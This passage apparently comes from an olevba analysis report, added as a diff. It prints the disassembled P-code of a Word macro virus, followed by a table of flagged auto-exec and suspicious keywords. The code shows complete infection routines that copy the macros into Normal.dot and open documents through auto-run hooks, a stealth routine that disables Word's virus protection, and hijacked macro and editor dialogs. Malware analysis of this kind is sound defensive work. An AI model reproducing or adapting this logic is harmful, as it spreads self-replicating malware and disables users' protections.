+' 	VarDefn ATemp (As Template)
+' Line #139:
+' 	ArgsCall Stealth 0x0000 
+' Line #140:
+' 	OnError (Resume Next) 
+' Line #141:
+' 	Ld NormalTemplate 
+' 	ArgsLd getInfected 0x0001 
+' 	Not 
+' 	IfBlock 
+' Line #142:
+' 	Ld ActiveDocument 
+' 	ArgsLd getInfected 0x0001 
+' 	IfBlock 
+' Line #143:
+' 	ArgsCall Copy2Normal 0x0000 
+' Line #144:
+' 	ElseBlock 
+' Line #145:
+' 	StartForVariable 
+' 	Ld ADoc 
+' 	EndForVariable 
+' 	Ld Documents 
+' 	ForEach 
+' Line #146:
+' 	Ld ADoc 
+' 	ArgsLd getInfected 0x0001 
+' 	IfBlock 
+' Line #147:
+' 	Ld ADoc 
+' 	Ld NormalTemplate 
+' 	ArgsCall Infecting 0x0002 
+' Line #148:
+' 	GoTo Jump1 
+' Line #149:
+' 	EndIfBlock 
+' Line #150:
+' 	StartForVariable 
+' 	Ld ADoc 
+' 	EndForVariable 
+' 	NextVar 
+' Line #151:
+' Line #152:
+' 	StartForVariable 
+' 	Ld ATemp 
+' 	EndForVariable 
+' 	Ld Templates 
+' 	ForEach 
+' Line #153:
+' 	Ld ATemp 
+' 	ArgsLd getInfected 0x0001 
+' 	IfBlock 
+' Line #154:
+' 	Ld ATemp 
+' 	Ld NormalTemplate 
+' 	ArgsCall Infecting 0x0002 
+' Line #155:
+' 	GoTo Jump1 
+' Line #156:
+' 	EndIfBlock 
+' Line #157:
+' 	StartForVariable 
+' 	Ld ATemp 
+' 	EndForVariable 
+' 	NextVar 
+' Line #158:
+' 	EndIfBlock 
+' Line #159:
+' 	EndIfBlock 
+' Line #160:
+' Line #161:
+' 	Ld NormalTemplate 
+' 	ArgsLd getInfected 0x0001 
+' 	Not 
+' 	IfBlock 
+' Line #162:
+' 	Ld ModuleName 
+' 	LitStr 0x0015 " has lost forever...."
+' 	Concat 
+' 	Ld Application 
+' 	MemSt StatusBar 
+' Line #163:
+' 	ExitSub 
+' Line #164:
+' 	EndIfBlock 
+' Line #165:
+' Line #166:
+' 	Label Jump1 
+' Line #167:
+' 	StartForVariable 
+' 	Ld ADoc 
+' 	EndForVariable 
+' 	Ld Documents 
+' 	ForEach 
+' Line #168:
+' 	Ld NormalTemplate 
+' 	Ld ADoc 
+' 	ArgsCall Infecting 0x0002 
+' Line #169:
+' 	OnError (Resume Next) 
+' Line #170:
+' 	Ld WordBasic 
+' 	ArgsMemCall viewpage 0x0000 
+' Line #171:
+' Line #172:
+' 	Ld ADoc 
+' 	MemLd AttachedTemplate 
+' 	Ld NormalTemplate 
+' 	Ne 
+' 	IfBlock 
+' Line #173:
+' 	Ld NormalTemplate 
+' 	Ld ADoc 
+' 	MemLd AttachedTemplate 
+' 	ArgsCall Infecting 0x0002 
+' Line #174:
+' 	Ld NormalTemplate 
+' 	Ld ADoc 
+' 	MemSt AttachedTemplate 
+' Line #175:
+' 	EndIfBlock 
+' Line #176:
+' 	StartForVariable 
+' 	Ld ADoc 
+' 	EndForVariable 
+' 	NextVar 
+' Line #177:
+' 	EndSub 
+' Line #178:
+' Line #179:
+' Line #180:
+' 	FuncDefn (Sub CreateMasterOffee())
+' Line #181:
+' 	Dim 
+' 	VarDefn ADoc (As Document)
+' 	VarDefn AI (As AddIn)
+' 	VarDefn GoOn (As Boolean)
+' 	VarDefn Win (As Window)
+' Line #182:
+' Line #183:
+' 	OnError (Resume Next) 
+' Line #184:
+' 	StartForVariable 
+' 	Ld AI 
+' 	EndForVariable 
+' 	Ld AddIns 
+' 	ForEach 
+' Line #185:
+' 	Ld AI 
+' 	MemLd New 
+' 	Ld ModuleName 
+' 	FnLen 
+' 	ArgsLd LBound$ 0x0002 
+' 	St off$ 
+' Line #186:
+' 	Ld off$ 
+' 	Ld ModuleName 
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	Ld AI 
+' 	ArgsMemCall Delete 0x0000 
+' 	EndIf 
+' Line #187:
+' 	StartForVariable 
+' 	Ld AI 
+' 	EndForVariable 
+' 	NextVar 
+' Line #188:
+' Line #189:
+' 	Ld NormalTemplate 
+' 	ArgsLd getInfected 0x0001 
+' 	IfBlock 
+' Line #190:
+' 	Ld wdPicturesPath 
+' 	Ld Options 
+' 	ArgsMemLd DefaultFilePath 0x0001 
+' 	LitStr 0x0001 "\"
+' 	Concat 
+' 	Ld ModuleName 
+' 	Concat 
+' 	Ld SeriesNumber 
+' 	ArgsLd Str 0x0001 
+' 	Concat 
+' 	LitStr 0x0004 ".dot"
+' 	Concat 
+' 	St MasterOffee 
+' Line #191:
+' 	SetStmt 
+' 	Ld NormalTemplate 
+' 	MemLd OpenAsDocument 
+' 	Set ADoc 
+' Line #192:
+' 	StartWithExpr 
+' 	Ld ADoc 
+' 	With 
+' Line #193:
+' 	LineCont 0x0004 0A 00 10 00
+' 	Ld MasterOffee 
+' 	ParamNamed fileName 
+' 	Ld wdFormatTemplate 
+' 	ParamNamed FileFormat 
+' 	LitVarSpecial (False)
+' 	ParamNamed AddToRecentFiles 
+' 	ArgsMemCallWith SaveAs 0x0003 
+' Line #194:
+' 	Ld wdDoNotSaveChanges 
+' 	ParamNamed saveChanges 
+' 	ArgsMemCallWith Close 0x0001 
+' Line #195:
+' 	EndWith 
+' Line #196:
+' Line #197:
+' 	Ld MasterOffee 
+' 	ParamNamed fileName 
+' 	LitVarSpecial (True)
+' 	ParamNamed install 
+' 	Ld AddIns 
+' 	ArgsMemCall Add 0x0002 
+' Line #198:
+' 	EndIfBlock 
+' Line #199:
+' 	EndSub 
+' Line #200:
+' Line #201:
+' Line #202:
+' 	QuoteRem 0x0000 0x0014 "infection procedures"
+' Line #203:
+' 	FuncDefn (Sub AutoOpen())
+' Line #204:
+' 	ArgsCall AnimateCaption 0x0000 
+' Line #205:
+' 	ArgsCall Stealth 0x0000 
+' Line #206:
+' 	LitVarSpecial (True)
+' 	Ld WordBasic 
+' 	ArgsMemCall disableautomacros 0x0001 
+' Line #207:
+' Line #208:
+' 	OnError (Resume Next) 
+' Line #209:
+' 	ArgsCall Copy2Normal 0x0000 
+' Line #210:
+' 	ArgsCall Copy2Document 0x0000 
+' Line #211:
+' 	Ld NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' Line #212:
+' 	EndSub 
+' Line #213:
+' Line #214:
+' 	FuncDefn (Sub FileOpen())
+' Line #215:
+' 	ArgsCall AnimateCaption 0x0000 
+' Line #216:
+' 	ArgsCall Stealth 0x0000 
+' Line #217:
+' 	LitVarSpecial (True)
+' 	Ld WordBasic 
+' 	ArgsMemCall disableautomacros 0x0001 
+' Line #218:
+' Line #219:
+' 	OnError (Resume Next) 
+' Line #220:
+' 	Ld wdDialogFileOpen 
+' 	ArgsLd Dialogs 0x0001 
+' 	MemLd Show 
+' 	LitDI2 0x0000 
+' 	Ne 
+' 	IfBlock 
+' Line #221:
+' 	ArgsCall Copy2Document 0x0000 
+' Line #222:
+' 	ArgsCall Copy2Normal 0x0000 
+' Line #223:
+' 	OnError (Resume Next) 
+' Line #224:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #225:
+' 	EndIfBlock 
+' Line #226:
+' 	LitVarSpecial (False)
+' 	Ld WordBasic 
+' 	ArgsMemCall disableautomacros 0x0001 
+' Line #227:
+' 	EndSub 
+' Line #228:
+' Line #229:
+' 	FuncDefn (Sub AutoClose())
+' Line #230:
+' 	ArgsCall AnimateCaption 0x0000 
+' Line #231:
+' 	ArgsCall Stealth 0x0000 
+' Line #232:
+' Line #233:
+' 	OnError (Resume Next) 
+' Line #234:
+' 	ArgsCall Copy2Document 0x0000 
+' Line #235:
+' 	Ld ActiveDocument 
+' 	MemLd Saved 
+' 	Not 
+' 	Ld ActiveDocument 
+' 	MemLd Characters 
+' 	MemLd Count 
+' 	LitDI2 0x0000 
+' 	Gt 
+' 	And 
+' 	If 
+' 	BoSImplicit 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' 	EndIf 
+' Line #236:
+' 	QuoteRem 0x0000 0x001F "    ActiveDocument.Saved = True"
+' Line #237:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ArgsCall ModifyAttr 0x0001 
+' Line #238:
+' 	EndSub 
+' Line #239:
+' Line #240:
+' 	FuncDefn (Sub FileClose())
+' Line #241:
+' 	Dim 
+' 	VarDefn afn (As String)
+' Line #242:
+' 	LitVarSpecial (True)
+' 	Ld WordBasic 
+' 	ArgsMemCall disableautomacros 0x0001 
+' Line #243:
+' Line #244:
+' 	OnError (Resume Next) 
+' Line #245:
+' 	ArgsCall AutoClose 0x0000 
+' Line #246:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	St afn 
+' Line #247:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Close 0x0000 
+' Line #248:
+' 	Ld afn 
+' 	ArgsCall ModifyAttr 0x0001 
+' Line #249:
+' 	LitVarSpecial (False)
+' 	Ld WordBasic 
+' 	ArgsMemCall disableautomacros 0x0001 
+' Line #250:
+' 	EndSub 
+' Line #251:
+' Line #252:
+' Line #253:
+' Line #254:
+' Line #255:
+' 	FuncDefn (Sub InitDialog())
+' Line #256:
+' 	ArgsCall AnimateCaption 0x0000 
+' Line #257:
+' 	ArgsCall Stealth 0x0000 
+' Line #258:
+' 	Ld wdAlertsNone 
+' 	Ld Application 
+' 	MemSt DisplayAlerts 
+' Line #259:
+' 	OnError (Resume Next) 
+' Line #260:
+' 	SetStmt 
+' 	Ld wdDialogToolsOptions 
+' 	ArgsLd Dialogs 0x0001 
+' 	Set ToolsOptionsDlg 
+' Line #261:
+' 	SetStmt 
+' 	Ld wdDialogOrganizer 
+' 	ArgsLd Dialogs 0x0001 
+' 	Set OrganizerDlg 
+' Line #262:
+' 	SetStmt 
+' 	Ld wdDialogToolsTemplates 
+' 	ArgsLd Dialogs 0x0001 
+' 	Set ToolsTemplatesDlg 
+' Line #263:
+' 	SetStmt 
+' 	Ld wdDialogToolsMacro 
+' 	ArgsLd Dialogs 0x0001 
+' 	Set ToolsMacrosDlg 
+' Line #264:
+' 	SetStmt 
+' 	Ld wdDialogFormatStyle 
+' 	ArgsLd Dialogs 0x0001 
+' 	Set FormatStyleDlg 
+' Line #265:
+' 	EndSub 
+' Line #266:
+' Line #267:
+' Line #268:
+' 	FuncDefn (Sub AutoExec())
+' Line #269:
+' 	Dim 
+' 	VarDefn Combar (As CommandBar)
+' Line #270:
+' 	LitVarSpecial (True)
+' 	Ld WordBasic 
+' 	ArgsMemCall disableautomacros 0x0001 
+' Line #271:
+' 	ArgsCall InitDialog 0x0000 
+' Line #272:
+' Line #273:
+' 	ArgsCall Copy2Normal 0x0000 
+' Line #274:
+' 	ArgsCall Copy2Document 0x0000 
+' Line #275:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsCall ModifyAttr 0x0001 
+' Line #276:
+' 	ArgsCall ClearAddDocProp 0x0000 
+' Line #277:
+' 	StartForVariable 
+' 	Ld Combar 
+' 	EndForVariable 
+' 	Ld Application 
+' 	MemLd CommandBars 
+' 	ForEach 
+' Line #278:
+' 	OnError (Resume Next) 
+' Line #279:
+' 	Ld Combar 
+' 	ArgsMemCall reset 0x0000 
+' Line #280:
+' 	StartForVariable 
+' 	Ld Combar 
+' 	EndForVariable 
+' 	NextVar 
+' Line #281:
+' 	EndSub 
+' Line #282:
+' Line #283:
+' 	FuncDefn (Sub AutoExit())
+' Line #284:
+' 	ArgsCall AutoOpen 0x0000 
+' Line #285:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ArgsCall ModifyAttr 0x0001 
+' Line #286:
+' 	EndSub 
+' Line #287:
+' Line #288:
+' 	FuncDefn (Sub AutoNew())
+' Line #289:
+' 	ArgsCall AutoExit 0x0000 
+' Line #290:
+' 	EndSub 
+' Line #291:
+' Line #292:
+' 	FuncDefn (Sub fileNewDefault())
+' Line #293:
+' 	ArgsCall AnimateCaption 0x0000 
+' Line #294:
+' 	ArgsCall Stealth 0x0000 
+' Line #295:
+' 	Ld WordBasic 
+' 	ArgsMemCall fileNewDefault 0x0000 
+' Line #296:
+' 	ArgsCall AutoExit 0x0000 
+' Line #297:
+' 	EndSub 
+' Line #298:
+' Line #299:
+' 	FuncDefn (Sub FileNew())
+' Line #300:
+' 	ArgsCall AnimateCaption 0x0000 
+' Line #301:
+' 	Ld wdDialogFileNew 
+' 	ArgsLd Dialogs 0x0001 
+' 	MemLd Show 
+' 	LitDI2 0x0000 
+' 	Ne 
+' 	If 
+' 	BoSImplicit 
+' 	ArgsCall AutoExit 0x0000 
+' 	EndIf 
+' Line #302:
+' 	EndSub 
+' Line #303:
+' Line #304:
+' 	FuncDefn (Sub Stealth())
+' Line #305:
+' 	OnError (Resume Next) 
+' Line #306:
+' 	StartWithExpr 
+' 	Ld Options 
+' 	With 
+' Line #307:
+' 	LitVarSpecial (False)
+' 	MemStWith SaveNormalPrompt 
+' Line #308:
+' 	LitVarSpecial (False)
+' 	MemStWith SavePropertiesPrompt 
+' Line #309:
+' 	LitVarSpecial (False)
+' 	MemStWith VirusProtection 
+' Line #310:
+' 	EndWith 
+' Line #311:
+' Line #312:
+' 	StartWithExpr 
+' 	Ld NormalTemplate 
+' 	With 
+' Line #313:
+' 	MemLdWith Saved 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ArgsMemCallWith Save 0x0000 
+' 	EndIf 
+' Line #314:
+' 	EndWith 
+' Line #315:
+' 	EndSub 
+' Line #316:
+' Line #317:
+' 	FuncDefn (Sub NoStealth())
+' Line #318:
+' 	StartWithExpr 
+' 	Ld Options 
+' 	With 
+' Line #319:
+' 	LitVarSpecial (True)
+' 	MemStWith SaveNormalPrompt 
+' Line #320:
+' 	LitVarSpecial (True)
+' 	MemStWith SavePropertiesPrompt 
+' Line #321:
+' 	LitVarSpecial (True)
+' 	MemStWith VirusProtection 
+' Line #322:
+' 	EndWith 
+' Line #323:
+' Line #324:
+' 	OnError (Resume Next) 
+' Line #325:
+' 	StartWithExpr 
+' 	Ld NormalTemplate 
+' 	With 
+' Line #326:
+' 	MemLdWith Saved 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	ArgsMemCallWith Save 0x0000 
+' 	EndIf 
+' Line #327:
+' 	EndWith 
+' Line #328:
+' 	EndSub 
+' Line #329:
+' Line #330:
+' 	FuncDefn (Sub ToolsOptions())
+' Line #331:
+' 	ArgsCall InitDialog 0x0000 
+' Line #332:
+' 	ArgsCall NoStealth 0x0000 
+' Line #333:
+' Line #334:
+' 	OnError (Resume Next) 
+' Line #335:
+' 	Ld WordBasic 
+' 	ArgsMemCall ToolsOptions 0x0000 
+' Line #336:
+' 	ArgsCall Stealth 0x0000 
+' Line #337:
+' 	EndSub 
+' Line #338:
+' Line #339:
+' Line #340:
+' 	FuncDefn (Sub NoAccess())
+' Line #341:
+' 	Ld msg 
+' 	Ld vbExclamation 
+' 	Ld abadacc 
+' 	ArgsLd MsgBox 0x0003 
+' 	St a 
+' Line #342:
+' 	ArgsCall Stealth 0x0000 
+' Line #343:
+' 	ArgsCall AnimateCaption 0x0000 
+' Line #344:
+' 	EndSub 
+' Line #345:
+' Line #346:
+' 	FuncDefn (Function PassDialog() As Boolean)
+' Line #347:
+' 	Dim 
+' 	VarDefn Cruel (As String)
+' 	VarDefn Passi (As String)
+' Line #348:
+' 	LitVarSpecial (False)
+' 	St PassDialog 
+' Line #349:
+' 	Ld ccc 
+' 	Ld code 
+' 	LitDI2 0x0009 
+' 	LitDI2 0x0002 
+' 	ArgsLd Mid$ 0x0003 
+' 	Add 
+' 	St Cruel 
+' Line #350:
+' 	Ld pass 
+' 	LitStr 0x0001 "("
+' 	Concat 
+' 	Ld ModuleName 
+' 	Concat 
+' 	Ld SeriesNumber 
+' 	ArgsLd Str 0x0001 
+' 	Concat 
+' 	LitStr 0x0005 ")  : "
+' 	Concat 
+' 	St Passi 
+' Line #351:
+' 	Ld Passi 
+' 	Ld badboy 
+' 	ArgsLd InputBox 0x0002 
+' 	ArgsLd LCase 0x0001 
+' 	Ld Cruel 
+' 	Eq 
+' 	IfBlock 
+' Line #352:
+' 	LitVarSpecial (True)
+' 	St PassDialog 
+' Line #353:
+' 	ElseBlock 
+' Line #354:
+' 	ArgsCall NoAccess 0x0000 
+' Line #355:
+' 	EndIfBlock 
+' Line #356:
+' 	EndFunc 
+' Line #357:
+' Line #358:
+' Line #359:
+' 	FuncDefn (Sub ToolsMacro())
+' Line #360:
+' 	ArgsCall InitDialog 0x0000 
+' Line #361:
+' 	Ld ToolsMacrosDlg 
+' 	ArgsMemCall Display 0x0000 
+' Line #362:
+' 	EndSub 
+' Line #363:
+' Line #364:
+' Line #365:
+' 	FuncDefn (Sub FileTemplates())
+' Line #366:
+' 	ArgsCall InitDialog 0x0000 
+' Line #367:
+' 	Ld ToolsTemplatesDlg 
+' 	ArgsMemCall Display 0x0000 
+' Line #368:
+' 	EndSub 
+' Line #369:
+' Line #370:
+' 	FuncDefn (Sub ViewVbCode())
+' Line #371:
+' 	ArgsCall AnimateCaption 0x0000 
+' Line #372:
+' 	ArgsCall Stealth 0x0000 
+' Line #373:
+' 	Ld PassDialog 
+' 	Ld Application 
+' 	MemSt ShowVisualBasicEditor 
+' Line #374:
+' 	EndSub 
+' Line #375:
+' Line #376:
+' 	FuncDefn (Sub viewcode())
+' Line #377:
+' 	ArgsCall ViewVbCode 0x0000 
+' Line #378:
+' 	EndSub 
+' Line #379:
+' Line #380:
+' 	FuncDefn (Sub Organizer())
+' Line #381:
+' 	ArgsCall InitDialog 0x0000 
+' Line #382:
+' 	Ld OrganizerDlg 
+' 	ArgsMemCall Display 0x0000 
+' Line #383:
+' 	EndSub 
+' Line #384:
+' Line #385:
+' 	FuncDefn (Sub FormatStyle())
+' Line #386:
+' 	ArgsCall InitDialog 0x0000 
+' Line #387:
+' 	StartWithExpr 
+' 	Ld FormatStyleDlg 
+' 	With 
+' Line #388:
+' 	ArgsMemCallWith Display 0x0000 
+' Line #389:
+' 	ArgsMemCallWith Execute 0x0000 
+' Line #390:
+' 	EndWith 
+' Line #391:
+' 	EndSub 
+' Line #392:
+' Line #393:
+' Line #394:
+' 	FuncDefn (Sub ModifyAttr(fileName As String))
+' Line #395:
+' 	OnError (Resume Next) 
+' Line #396:
+' 	Ld fileName 
+' 	ArgsLd GetAttr 0x0001 
+' 	Ld vbArchive 
+' 	Ne 
+' 	If 
+' 	BoSImplicit 
+' 	Ld fileName 
+' 	Ld vbArchive 
+' 	ArgsCall SetAttr 0x0002 
+' 	EndIf 
+' Line #397:
+' 	EndSub 
+' Line #398:
+' Line #399:
+' Line #400:
+' 	FuncDefn (Sub AnimateCaption())
+' Line #401:
+' 	OnError (Resume Next) 
+' Line #402:
+' 	Ld Documents 
+' 	MemLd Count 
+' 	LitDI2 0x0000 
+' 	Gt 
+' 	If 
+' 	BoSImplicit 
+' 	Ld WordBasic 
+' 	ArgsMemCall viewpage 0x0000 
+' 	EndIf 
+' Line #403:
+' Line #404:
+' 	LitDI2 0x0000 
+' 	St Seq 
+' Line #405:
+' 	LitDI2 0x0000 
+' 	St Iteration 
+' Line #406:
+' 	Ld Now 
+' 	LitDI2 0x0000 
+' 	LitDI2 0x0000 
+' 	LitDI2 0x0003 
+' 	ArgsLd TimeSerial 0x0003 
+' 	Add 
+' 	Ld ScrollStringProc 
+' 	Ld Application 
+' 	ArgsMemCall OnTime 0x0002 
+' Line #407:
+' 	EndSub 
+' Line #408:
+' Line #409:
+' 	FuncDefn (Sub ScrollString())
+' Line #410:
+' 	Ld Seq 
+' 	SelectCase 
+' Line #411:
+' 	LitDI2 0x0000 
+' 	Case 
+' 	CaseDone 
+' Line #412:
+' 	Ld OFC 
+' 	St AppCaption 
+' Line #413:
+' 	Ld Peace 
+' 	St WinCaption 
+' Line #414:
+' 	LitDI2 0x0001 
+' 	St Seq 
+' Line #415:
+' 	CaseElse 
+' Line #416:
+' 	Ld mw 
+' 	St AppCaption 
+' Line #417:
+' 	ArgsCall RestoreWindowCaption 0x0000 
+' Line #418:
+' 	Ld Documents 
+' 	MemLd Count 
+' 	LitDI2 0x0000 
+' 	Gt 
+' 	IfBlock 
+' Line #419:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	St WinCaption 
+' Line #420:
+' 	ElseBlock 
+' Line #421:
+' 	LitStr 0x0001 " "
+' 	St WinCaption 
+' Line #422:
+' 	EndIfBlock 
+' Line #423:
+' 	LitDI2 0x0000 
+' 	St Seq 
+' Line #424:
+' 	EndSelect 
+' Line #425:
+' Line #426:
+' 	OnError (Resume Next) 
+' Line #427:
+' 	LitDI2 0x0000 
+' 	St AppCaptionPos 
+' Line #428:
+' 	LitDI2 0x0000 
+' 	St WinCaptionPos 
+' Line #429:
+' 	Ld Iteration 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St Iteration 
+' Line #430:
+' Line #431:
+' 	Ld Now 
+' 	LitDI2 0x0000 
+' 	LitDI2 0x0000 
+' 	LitDI2 0x0003 
+' 	ArgsLd TimeSerial 0x0003 
+' 	Add 
+' 	Ld ScrollingProc 
+' 	Ld Application 
+' 	ArgsMemCall OnTime 0x0002 
+' Line #432:
+' 	EndSub 
+' Line #433:
+' Line #434:
+' 	FuncDefn (Sub Scrolling())
+' Line #435:
+' 	Ld AppCaption 
+' 	Ld AppCaptionPos 
+' 	ArgsLd Right$ 0x0002 
+' 	Ld Application 
+' 	MemSt Caption 
+' Line #436:
+' 	Ld AppCaptionPos 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St AppCaptionPos 
+' Line #437:
+' Line #438:
+' 	LineCont 0x0004 07 00 08 00
+' 	Ld Documents 
+' 	MemLd Count 
+' 	LitDI2 0x0000 
+' 	Gt 
+' 	If 
+' 	BoSImplicit 
+' 	Ld WinCaption 
+' 	Ld WinCaptionPos 
+' 	ArgsLd Right$ 0x0002 
+' 	Ld ActiveWindow 
+' 	MemSt Caption 
+' 	EndIf 
+' Line #439:
+' 	Ld WinCaptionPos 
+' 	LitDI2 0x0001 
+' 	Add 
+' 	St WinCaptionPos 
+' Line #440:
+' Line #441:
+' 	Ld WinCaptionPos 
+' 	Ld WinCaption 
+' 	FnLen 
+' 	Gt 
+' 	Ld AppCaption 
+' 	FnLen 
+' 	Ld AppCaptionPos 
+' 	Lt 
+' 	And 
+' 	IfBlock 
+' Line #442:
+' 	Ld Seq 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	IfBlock 
+' Line #443:
+' 	Ld Now 
+' 	LitDI2 0x0000 
+' 	LitDI2 0x0000 
+' 	LitDI2 0x0003 
+' 	ArgsLd TimeSerial 0x0003 
+' 	Add 
+' 	Ld ScrollStringProc 
+' 	Ld Application 
+' 	ArgsMemCall OnTime 0x0002 
+' Line #444:
+' 	Ld Seq 
+' 	LitDI2 0x0000 
+' 	Eq 
+' 	ElseIfBlock 
+' Line #445:
+' 	Ld Iteration 
+' 	LitDI2 0x0005 
+' 	Lt 
+' 	IfBlock 
+' Line #446:
+' 	ArgsCall Copy2Document 0x0000 
+' Line #447:
+' 	QuoteRem 0x0000 0x001B "                Copy2Normal"
+' Line #448:
+' 	Ld Now 
+' 	LitDI2 0x0000 
+' 	LitDI2 0x0000 
+' 	LitDI2 0x000A 
+' 	ArgsLd TimeSerial 0x0003 
+' 	Add 
+' 	Ld ScrollStringProc 
+' 	Ld Application 
+' 	ArgsMemCall OnTime 0x0002 
+' Line #449:
+' 	ElseBlock 
+' Line #450:
+' 	QuoteRem 0x0000 0x001B "                Copy2Normal"
+' Line #451:
+' 	ExitSub 
+' Line #452:
+' 	EndIfBlock 
+' Line #453:
+' 	EndIfBlock 
+' Line #454:
+' 	ElseBlock 
+' Line #455:
+' 	Ld Now 
+' 	LitDI2 0x0000 
+' 	LitDI2 0x0000 
+' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
+' 	ArgsLd TimeSerial 0x0003 
+' 	Add 
+' 	Ld ScrollingProc 
+' 	Ld Application 
+' 	ArgsMemCall OnTime 0x0002 
+' Line #456:
+' 	EndIfBlock 
+' Line #457:
+' 	EndSub 
+' Line #458:
+' Line #459:
+' 	FuncDefn (Sub RestoreWindowCaption())
+' Line #460:
+' 	Dim 
+' 	VarDefn Win (As Window)
+' Line #461:
+' 	OnError (Resume Next) 
+' Line #462:
+' 	StartForVariable 
+' 	Ld Win 
+' 	EndForVariable 
+' 	Ld Windows 
+' 	ForEach 
+' Line #463:
+' 	Ld Win 
+' 	MemLd Document 
+' 	MemLd FullName 
+' 	Ld Win 
+' 	MemSt Caption 
+' Line #464:
+' 	StartForVariable 
+' 	Ld Win 
+' 	EndForVariable 
+' 	NextVar 
+' Line #465:
+' 	EndSub 
+' Line #466:
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |AutoExec            |Runs when the Word document is opened        |
+|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+|AutoExec  |AutoExit            |Runs when the Word document is closed        |
+|AutoExec  |AutoClose           |Runs when the Word document is closed        |
+|AutoExec  |AutoNew             |Runs when a new Word document is created     |
+|Suspicious|Windows             |May enumerate application windows (if        |
+|          |                    |combined with Shell.Application object)      |
+|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
